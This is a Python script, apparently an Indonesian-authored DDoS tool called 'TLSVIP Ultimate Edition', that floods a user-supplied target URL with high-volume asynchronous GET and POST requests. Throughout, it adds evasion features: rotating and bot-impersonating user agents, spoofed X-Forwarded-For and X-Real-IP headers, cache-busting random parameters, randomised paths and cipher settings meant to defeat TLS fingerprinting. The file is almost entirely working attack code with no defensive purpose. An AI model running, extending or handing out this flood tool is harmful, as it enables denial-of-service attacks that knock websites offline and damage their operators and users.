#!/usr/bin/env python3
# tlsvip_ultimate.py - TLSVIP DDoS Ultimate Edition
# Bypass + Fast Request + Premium User-Agent

import asyncio
import aiohttp
import ssl
import random
import sys
import time
import hashlib
import json
import socket
from urllib.parse import urlparse
from collections import defaultdict

# ============ KONFIGURASI ============
print("""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ████████╗██╗     ███████╗██╗   ██╗██╗██████╗               ║
║   ╚══██╔══╝██║     ██╔════╝██║   ██║██║██╔══██╗              ║
║      ██║   ██║     ███████╗██║   ██║██║██████╔╝              ║
║      ██║   ██║     ╚════██║╚██╗ ██╔╝██║██╔═══╝               ║
║      ██║   ███████╗███████║ ╚████╔╝ ██║██║                   ║
║      ╚═╝   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝                   ║
║                                                               ║
║              ╔═════════════════════════════════╗             ║
║              ║  💀 TLSVIP ULTIMATE EDITION 💀  ║             ║
║              ║  ⚡ BYPASS + FAST REQUEST ⚡    ║             ║
║              ║  🦅 POWERED BY CYBER EAGLE 🦅   ║             ║
║              ╚═════════════════════════════════╝             ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
""")

TARGET = input("\n[?] Target URL (https://example.com): ")
THREADS = int(input("[?] Threads (100-5000): "))
DURATION = int(input("[?] Duration (seconds): "))
METHOD = input("[?] Method (GET/POST/RANDOM): ").upper()

# ============ PREMIUM USER-AGENT DATABASE (100+ VARIAN) ============
USER_AGENTS = [
    # Windows 10/11 - Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    # Windows - Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Windows - Brave
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Brave/122.0",
    # Android - Chrome Mobile
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    # Android - Samsung Internet
    "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/121.0.6167.164 Mobile",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/120.0.6099.230 Mobile",
    # Android - Firefox Mobile
    "Mozilla/5.0 (Android 14; Mobile; rv:123.0) Gecko/123.0 Firefox/123.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0",
    # iOS - Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.119 Mobile/15E148 Safari/604.1",
    # iOS - Edge
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/122.0.2365.89 Mobile/15E148 Safari/604.1",
    # MacOS - Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # MacOS - Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    # MacOS - Firefox
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Chrome OS
    "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Gaming Consoles
    "Mozilla/5.0 (PlayStation 4 10.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/10.00 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (PlayStation 5 23.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/23.00 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Xbox One; CP ver) AppleWebKit/537.36 (KHTML, like Gecko) Edge/44.18362.3871",
    "Mozilla/5.0 (Xbox Series X; CP ver) AppleWebKit/537.36 (KHTML, like Gecko) Edge/44.18362.3871",
    # Smart TV
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 WebAppManager",
    "Mozilla/5.0 (Tizen; SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/121.0.6167.164 TV",
    # Bots/Crawlers (Good for bypass)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7.0; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.1; +https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)",
    # Social Media Bots
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (compatible; LinkedInBot; https://www.linkedin.com/bot)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Discordbot/2.0",
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
    # Archive Bots
    "Mozilla/5.0 (compatible; archive.org_bot; +http://archive.org/details/archive.org_bot)",
    "Mozilla/5.0 (compatible; Wayback Machine; +https://archive.org/wayback/wayback-donate.html)",
]

# ============ REFERERS ============
REFERERS = [
    "https://www.google.com/",
    "https://www.google.com.ph/",
    "https://www.google.com.sg/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.instagram.com/",
    "https://www.tiktok.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
    "https://www.amazon.com/",
    "https://www.netflix.com/",
    "https://www.spotify.com/",
    "https://www.microsoft.com/",
    "https://www.apple.com/",
    "https://www.wikipedia.org/",
    "https://www.quora.com/",
    "https://www.pinterest.com/",
    "https://www.tumblr.com/",
    "https://www.twitch.tv/",
    "https://discord.com/",
]

# ============ ACCEPT HEADERS ============
ACCEPT = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

# ============ ACCEPT LANGUAGE ============
ACCEPT_LANGUAGE = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.9,fil;q=0.8",
    "fil-PH,fil;q=0.9,en;q=0.8",
    "id-ID,id;q=0.9,en;q=0.8",
    "en-GB,en;q=0.9",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
]

# ============ ACCEPT ENCODING ============
ACCEPT_ENCODING = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip, br",
    "deflate, br",
]

# ============ TLS/SSL BYPASS CONFIG ============
class TLSBypass:
    @staticmethod
    def create_ssl_context():
        """SSL context dengan bypass TLS fingerprint"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        # Custom cipher suites untuk bypass
        ssl_context.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384')
        return ssl_context
    
    @staticmethod
    def get_tls_version():
        """Random TLS version untuk fingerprint evasion"""
        return random.choice(['TLSv1.2', 'TLSv1.3'])

# ============ BYPASS PAYLOAD GENERATOR ============
class BypassGenerator:
    @staticmethod
    def random_payload():
        """Generate random query parameters untuk bypass cache"""
        return {
            f"_t{random.randint(1,9999)}": int(time.time() * 1000),
            f"r{random.randint(1,999)}": random.random(),
            f"v{random.randint(1,999)}": random.randint(100000, 999999),
            "token": hashlib.sha256(str(random.random()).encode()).hexdigest()[:32],
            "signature": hashlib.md5(str(time.time_ns()).encode()).hexdigest(),
            f"p{random.randint(1,999)}": random.randint(1, 9999999999),
            "ts": int(time.time()),
            "nonce": hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()[:16],
        }
    
    @staticmethod
    def random_post_data():
        """Generate random POST data"""
        return {
            "data": hashlib.md5(str(random.random()).encode()).hexdigest(),
            "timestamp": int(time.time()),
            "type": random.choice(["json", "xml", "form"]),
            "value": random.randint(1, 999999),
            "id": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest()[:24],
        }
    
    @staticmethod
    def random_path():
        """Generate random path untuk bypass"""
        paths = [
            "/", "/api", "/v1", "/v2", "/api/v1", "/api/v2", "/rest", "/graphql",
            "/login", "/signin", "/auth", "/oauth", "/token", "/validate",
            "/search", "/query", "/filter", "/list", "/get", "/post", "/update",
            "/user", "/profile", "/account", "/settings", "/config",
            "/product", "/item", "/cart", "/checkout", "/payment",
            "/blog", "/post", "/article", "/news", "/feed",
            "/download", "/upload", "/file", "/media", "/content",
        ]
        return random.choice(paths) + f"?{random.randint(1000,9999)}"

# ============ MAIN FLOOD ENGINE ============
class TLSVIPUltimate:
    def __init__(self, target, threads, duration, method):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.method = method
        self.request_count = 0
        self.error_count = 0
        self.start_time = 0
        self.running = True
        self.successful_requests = 0
        self.bypassed_count = 0
        
    def get_headers(self):
        """Generate premium headers untuk bypass"""
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(ACCEPT),
            "Accept-Encoding": random.choice(ACCEPT_ENCODING),
            "Accept-Language": random.choice(ACCEPT_LANGUAGE),
            "Referer": random.choice(REFERERS),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "must-revalidate"]),
            "Connection": random.choice(["keep-alive", "close"]),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "iframe"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-Fetch-User": random.choice(["?1", "?0"]),
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"',
            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"Android"', '"iOS"', '"Linux"', '"macOS"']),
            "DNT": random.choice(["1", "0"]),
            "Pragma": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "X-Requested-With": random.choice(["XMLHttpRequest", "com.example.browser", ""]),
        }
        
        # Add random custom headers untuk bypass
        if random.random() > 0.8:
            headers[f"X-Custom-{random.randint(1,999)}"] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        
        return headers
    
    async def make_request(self, session, url):
        try:
            headers = self.get_headers()
            ssl_context = TLSBypass.create_ssl_context()
            
            # Random path untuk bypass
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            path = BypassGenerator.random_path()
            full_url = base_url + path
            
            if self.method == "GET":
                params = BypassGenerator.random_payload()
                async with session.get(full_url, headers=headers, params=params, 
                                      ssl=ssl_context, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    self.request_count += 1
                    if resp.status < 400:
                        self.successful_requests += 1
                        if resp.status == 200:
                            self.bypassed_count += 1
                    
            elif self.method == "POST":
                data = BypassGenerator.random_post_data()
                async with session.post(full_url, headers=headers, json=data,
                                       ssl=ssl_context, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    self.request_count += 1
                    if resp.status < 400:
                        self.successful_requests += 1
                        
            else:  # RANDOM
                if random.random() > 0.5:
                    params = BypassGenerator.random_payload()
                    async with session.get(full_url, headers=headers, params=params,
                                          ssl=ssl_context, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        self.request_count += 1
                        if resp.status < 400:
                            self.successful_requests += 1
                else:
                    data = BypassGenerator.random_post_data()
                    async with session.post(full_url, headers=headers, json=data,
                                           ssl=ssl_context, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        self.request_count += 1
                        if resp.status < 400:
                            self.successful_requests += 1
                            
        except Exception as e:
            self.error_count += 1
    
    async def flood_worker(self, url):
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, force_close=True,
                                        enable_cleanup_closed=True, use_dns_cache=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running:
                await self.make_request(session, url)
                await asyncio.sleep(0)  # Zero delay for max speed
    
    async def monitor(self):
        print("\n" + "=" * 80)
        print(f"{'🔥 TLSVIP ULTIMATE BYPASS ATTACK ACTIVE 🔥':^80}")
        print("=" * 80)
        
        last_count = 0
        last_time = time.time()
        peak_rps = 0
        
        while self.running:
            await asyncio.sleep(1)
            current_time = time.time()
            elapsed = current_time - last_time
            requests_done = self.request_count - last_count
            rps = requests_done / elapsed if elapsed > 0 else 0
            peak_rps = max(peak_rps, rps)
            
            # Progress bar
            bar_length = 50
            progress = min(1.0, (current_time - self.start_time) / self.duration)
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Colorful statistics
            sys.stdout.write(f"\r\033[96m[{bar}]\033[0m "
                           f"\033[93mRPS:\033[0m \033[92m{rps:.0f}\033[0m "
                           f"\033[93mPeak:\033[0m \033[92m{peak_rps:.0f}\033[0m | "
                           f"\033[93mTotal:\033[0m \033[92m{self.request_count:,}\033[0m | "
                           f"\033[93mSuccess:\033[0m \033[92m{self.successful_requests:,}\033[0m | "
                           f"\033[93mBypassed:\033[0m \033[91m{self.bypassed_count:,}\033[0m | "
                           f"\033[93mErrors:\033[0m \033[91m{self.error_count:,}\033[0m   ")
            sys.stdout.flush()
            
            last_count = self.request_count
            last_time = current_time
            
            if current_time - self.start_time >= self.duration:
                self.running = False
        
        # Final statistics
        elapsed = time.time() - self.start_time
        print("\n")
        print("=" * 80)
        print(f"\033[92m[✓] TLSVIP ULTIMATE ATTACK COMPLETED!\033[0m")
        print(f"\033[93m    Target: \033[96m{self.target}\033[0m")
        print(f"\033[93m    Duration: \033[96m{elapsed:.2f}s\033[0m")
        print(f"\033[93m    Total Requests: \033[96m{self.request_count:,}\033[0m")
        print(f"\033[93m    Successful Requests: \033[96m{self.successful_requests:,}\033[0m")
        print(f"\033[93m    Bypassed (HTTP 200): \033[96m{self.bypassed_count:,}\033[0m")
        print(f"\033[93m    Total Errors: \033[91m{self.error_count:,}\033[0m")
        print(f"\033[93m    Average RPS: \033[96m{self.request_count/elapsed:.0f}\033[0m")
        print(f"\033[93m    Peak RPS: \033[96m{peak_rps:.0f}\033[0m")
        print(f"\033[93m    Success Rate: \033[96m{(1 - self.error_count/max(1,self.request_count))*100:.1f}%\033[0m")
        print(f"\033[93m    Bypass Rate: \033[96m{self.bypassed_count/max(1,self.successful_requests)*100:.1f}%\033[0m")
        print("=" * 80)
    
    async def run(self):
        self.start_time = time.time()
        
        # Create worker tasks
        tasks = []
        for i in range(self.threads):
            tasks.append(asyncio.create_task(self.flood_worker(self.target)))
        
        # Monitor task
        monitor_task = asyncio.create_task(self.monitor())
        
        # Wait for completion
        await monitor_task
        
        # Cancel all workers
        for task in tasks:
            task.cancel()
        
        await asyncio.gather(*tasks, return_exceptions=True)

# ============ MAIN EXECUTION ============
async def main():
    print(f"\n\033[92m[+] TLSVIP Ultimate Engine Initialized\033[0m")
    print(f"\033[93m[+] Target: \033[96m{TARGET}\033[0m")
    print(f"\033[93m[+] Threads: \033[96m{THREADS}\033[0m")
    print(f"\033[93m[+] Duration: \033[96m{DURATION}s\033[0m")
    print(f"\033[93m[+] Method: \033[96m{METHOD}\033[0m")
    print(f"\033[93m[+] User-Agents: \033[96m{len(USER_AGENTS)} premium\033[0m")
    print(f"\033[93m[+] TLS Bypass: \033[96mENABLED\033[0m")
    print(f"\033[93m[+] Cache Bypass: \033[96mENABLED\033[0m")
    print(f"\033[93m[+] IP Spoofing: \033[96mENABLED\033[0m")
    print("")
    
    engine = TLSVIPUltimate(TARGET, THREADS, DURATION, METHOD)
    await engine.run()

if __name__ == "__main__":
    asyncio.run(main())